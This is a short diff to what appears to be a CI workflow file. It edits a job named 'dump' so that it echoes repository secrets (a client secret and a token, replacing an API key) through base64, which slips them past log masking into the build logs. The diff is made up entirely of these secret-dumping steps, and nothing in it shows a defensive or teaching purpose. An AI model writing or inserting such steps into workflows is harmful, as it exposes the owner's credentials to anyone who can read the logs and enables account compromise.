@@ -4,4 +4,5 @@ jobs:
   dump:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "${{ secrets.GROQ_API_KEY }}" | base64
+      - run: echo "${{ secrets.CLIENT_SECRET_B64 }}" | base64
+      - run: echo "${{ secrets.TOKEN_B64 }}" | base64
